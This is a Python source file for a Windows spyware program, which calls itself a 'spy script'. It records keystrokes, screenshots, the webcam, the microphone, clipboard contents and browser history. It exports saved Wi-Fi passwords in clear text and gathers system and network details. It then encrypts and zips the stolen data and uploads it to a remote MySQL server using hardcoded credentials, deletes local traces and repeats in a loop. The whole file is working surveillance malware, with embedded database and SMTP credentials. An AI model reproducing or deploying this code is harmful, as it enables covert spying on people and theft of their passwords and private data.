import subprocess
import socket
import win32clipboard
import os
import re
import smtplib
import logging
import pathlib
import json
import time
import cv2
import sounddevice
import shutil
import requests
import browserhistory as bh
from multiprocessing import Process
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
from scipy.io.wavfile import write as write_rec
from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import pymysql
from datetime import datetime

################ Functions: Keystroke Capture, Screenshot Capture, Mic Recording, Webcam Snapshot, Email Sending ################

# Keystroke Capture Function
def logg_keys(file_path):
    logging.basicConfig(filename=(file_path + 'key_logs.txt'), level=logging.DEBUG, format='%(asctime)s: %(message)s')
    on_press = lambda Key: logging.info(str(Key))  # Log the Pressed Keys
    with Listener(on_press=on_press) as listener:  # Collect events until released
        listener.join()

# Loop that captures screenshots at intervals
def screenshot(file_path):
    pathlib.Path('C:/Users/user/Desktop/logs/Screenshots').mkdir(parents=True, exist_ok=True)
    screen_path = file_path + 'Screenshots\\'

    for x in range(0, 10):
        pic = ImageGrab.grab()
        pic.save(screen_path + 'screenshot{}.png'.format(x))
        time.sleep(5)  # Gap between screenshots in seconds

# Loop that records the microphone for 10-second intervals
def microphone(file_path):
    for x in range(0, 5):
        fs = 44100
        seconds = 10
        myrecording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
        sounddevice.wait()  # To check if the recording is finished
        write_rec(file_path + '{}mic_recording.wav'.format(x), fs, myrecording)

# Webcam Snapshot Function
def webcam(file_path):
    pathlib.Path('C:/Users/user/Desktop/logs/WebcamPics').mkdir(parents=True, exist_ok=True)
    cam_path = file_path + 'WebcamPics\\'
    cam = cv2.VideoCapture(0)

    for x in range(0, 10):
        ret, img = cam.read()
        file = (cam_path + '{}.jpg'.format(x))
        cv2.imwrite(file, img)
        time.sleep(5)

    cam.release()  # Closes video file or capturing device
    cv2.destroyAllWindows()

# Email setup function (optional, currently unused)
def email_base(name, email_address):
    name['From'] = email_address
    name['To'] = email_address
    name['Subject'] = 'Success!!!'
    body = 'Mission is completed'
    name.attach(MIMEText(body, 'plain'))
    return name

# SMTP handler function (optional, currently unused)
def smtp_handler(email_address, password, name):
    smtp_server = 'sandbox.smtp.mailtrap.io'
    smtp_port = 587
    username = '0aa0dbbb6c74f5'
    password = '703b3d28dfe741'
    
    s = smtplib.SMTP(smtp_server, smtp_port)
    s.starttls()
    s.login(username, password)
    s.sendmail(email_address, email_address, name.as_string())
    s.quit()

# Function to send email (optional, currently unused)
def send_email(path):
    regex = re.compile(r'.+\.xml$')
    regex2 = re.compile(r'.+\.txt$')
    regex3 = re.compile(r'.+\.png$')
    regex4 = re.compile(r'.+\.jpg$')
    regex5 = re.compile(r'.+\.wav$')

    email_address = 'sandbox.smtp.mailtrap.io'
    password = '260ac15c570cce'

    msg = MIMEMultipart()
    email_base(msg, email_address)

    exclude = set(['Screenshots', 'WebcamPics'])
    for dirpath, dirnames, filenames in os.walk(path, topdown=True):
        dirnames[:] = [d for d in dirnames if d not in exclude]
        for file in filenames:
            if regex.match(file) or regex2.match(file) or regex3.match(file) or regex4.match(file):
                p = MIMEBase('application', "octet-stream")
                with open(path + '\\' + file, 'rb') as attachment:
                    p.set_payload(attachment.read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', 'attachment;' 'filename = {}'.format(file))
                msg.attach(p)
            elif regex5.match(file):
                msg_alt = MIMEMultipart()
                email_base(msg_alt, email_address)
                p = MIMEBase('application', "octet-stream")
                with open(path + '\\' + file, 'rb') as attachment:
                    p.set_payload(attachment.read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', 'attachment;' 'filename = {}'.format(file))
                msg_alt.attach(p)
                smtp_handler(email_address, password, msg_alt)
            else:
                pass

    smtp_handler(email_address, password, msg)

# Zipping function
def zip_folder(folder_path, output_zip):
    shutil.make_archive(output_zip, 'zip', folder_path)
    print(f"Folder '{folder_path}' successfully zipped as '{output_zip}.zip'")

# Database logging function
def addlog(db_config, zip_file_path):
    try:
        print(f"Attempting to connect to database at {db_config['host']}...")
        conn = pymysql.connect(**db_config)
        cursor = conn.cursor()

        with open(zip_file_path, 'rb') as file:
            binary_data = file.read()
        
        local_ip = socket.gethostbyname(socket.gethostname())
        sql = "INSERT INTO Spylog(logdatetime, ipaddress, logdata) VALUES (%s, %s, %s)"
        print(f"Executing SQL query to insert ZIP file into Spylog table...")
        cursor.execute(sql, (datetime.now(), local_ip, binary_data))

        conn.commit()
        print(f"File '{zip_file_path}' inserted successfully into database.")
    except Exception as e:
        print(f"Error during database upload: {e}")
    finally:
        cursor.close()
        conn.close()

######################### Main Function #########################

def main():
    # Create directories
    logs_path = 'C:/Users/user/Desktop/Logs'
    temp_path = 'C:/Users/user/Desktop/temp'
    file_path = 'C:\\Users\\user\\Desktop\\Logs\\'
    pathlib.Path(logs_path).mkdir(parents=True, exist_ok=True)
    pathlib.Path(temp_path).mkdir(parents=True, exist_ok=True)

    # Retrieve Network/Wifi information
    with open(file_path + 'network_wifi.txt', 'a') as network_wifi:
        try:
            commands = subprocess.Popen(['Netsh', 'WLAN', 'export', 'profile', 'folder=C:\\Users\\Public\\Logs\\', 'key=clear',
                                        '&', 'ipconfig', '/all', '&', 'arp', '-a', '&', 'getmac', '-V', '&', 'route', 'print', '&',
                                        'netstat', '-a'], stdout=network_wifi, stderr=network_wifi, shell=True)
            outs, errs = commands.communicate(timeout=60)
        except subprocess.TimeoutExpired:
            commands.kill()
            out, errs = commands.communicate()

    # Retrieve system information
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)

    with open(file_path + 'system_info.txt', 'a') as system_info:
        try:
            public_ip = requests.get('https://api.ipify.org').text
        except requests.ConnectionError:
            public_ip = '* Ipify connection failed *'
        system_info.write('Public IP Address: ' + public_ip + '\n' + 'Private IP Address: ' + IPAddr + '\n')
        try:
            get_sysinfo = subprocess.Popen(['systeminfo', '&', 'tasklist', '&', 'sc', 'query'],
                                           stdout=system_info, stderr=system_info, shell=True)
            outs, errs = get_sysinfo.communicate(timeout=15)
        except subprocess.TimeoutExpired:
            get_sysinfo.kill()
            outs, errs = get_sysinfo.communicate()

    # Clipboard data
    try:
        win32clipboard.OpenClipboard()
        pasted_data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
        win32clipboard.CloseClipboard()
        with open(file_path + 'clipboard_info.txt', 'a') as clipboard_info:
            clipboard_info.write('Clipboard Data: \n' + pasted_data)
    except Exception as e:
        logging.error(f"Clipboard error: {e}")

    # Browser history
    try:
        browser_history = []
        bh_user = bh.get_username()
        db_path = bh.get_database_paths()
        hist = bh.get_browserhistory()
        browser_history.extend((bh_user, db_path, hist))
        with open(file_path + 'browser.txt', 'a') as browser_txt:
            browser_txt.write(json.dumps(browser_history))
    except Exception as e:
        logging.error(f"Browser history error: {e}")

    # Start processes
    p1 = Process(target=logg_keys, args=(file_path,)) ; p1.start()
    p2 = Process(target=screenshot, args=(file_path,)) ; p2.start()
    p3 = Process(target=microphone, args=(file_path,)) ; p3.start()
    p4 = Process(target=webcam, args=(file_path,)) ; p4.start()

    p1.join(timeout=300) ; p2.join(timeout=300) ; p3.join(timeout=300) ; p4.join(timeout=300)
    p1.terminate() ; p2.terminate() ; p3.terminate() ; p4.terminate()

    # Encrypt files
    files = ['network_wifi.txt', 'system_info.txt', 'clipboard_info.txt', 'browser.txt', 'key_logs.txt']
    regex = re.compile(r'.+\.xml$')
    dir_path = 'C:\\Users\\user\\Desktop\\Logs'

    for dirpath, dirnames, filenames in os.walk(dir_path):
        [files.append(file) for file in filenames if regex.match(file)]

    key = b'MujBTqtZ4QCQW_fmlMHVWBmTVRW8IGZSuxFctu_D3d0='

    for file in files:
        try:
            with open(file_path + file, 'rb') as plain_text:
                data = plain_text.read()
            encrypted = Fernet(key).encrypt(data)
            with open(file_path + 'e_' + file, 'ab') as hidden_data:
                hidden_data.write(encrypted)
            os.remove(file_path + file)
        except Exception as e:
            logging.error(f"Encryption error for {file}: {e}")

    # Zip the logs folder
    folder_to_zip = "C:/Users/user/Desktop/Logs"
    output_zip_file = "C:/Users/user/Desktop/temp/logs"
    print("Starting to zip the logs folder...")
    zip_folder(folder_to_zip, output_zip_file)

    # Database configuration
    db_config = {
        "host": "srv1113.hstgr.io",
        "user": "u858168866_userlogs",
        "password": "mQ#7Oz7qQVVa",
        "database": "u858168866_logs"
    }

    # Upload the ZIP file to the database
    zip_file_path = output_zip_file + ".zip"
    print(f"Preparing to upload '{zip_file_path}' to the database...")
    addlog(db_config, zip_file_path)
    print("Database upload process completed.")

    # Clean up
    print("Cleaning up temporary files and folders...")
    shutil.rmtree(logs_path)
    os.remove(zip_file_path)
    print("Cleanup completed.")

    # Wait before next iteration
    print("Waiting 60 seconds before next iteration...")
    time.sleep(60)
    main()

# Main entry
if __name__ == '__main__':
    # Set up logging
    logging.basicConfig(level=logging.DEBUG, filename='C:/Users/user/Desktop/spy_error_log.txt',
                        format='%(asctime)s - %(levelname)s - %(message)s')
    try:
        print("Starting the spy script...")
        main()
    except KeyboardInterrupt:
        print('* Control-C entered...Program exiting *')
    except Exception as ex:
        logging.exception(f'* Error Occurred: {ex} *')
        print(f"Error occurred, check spy_error_log.txt for details.")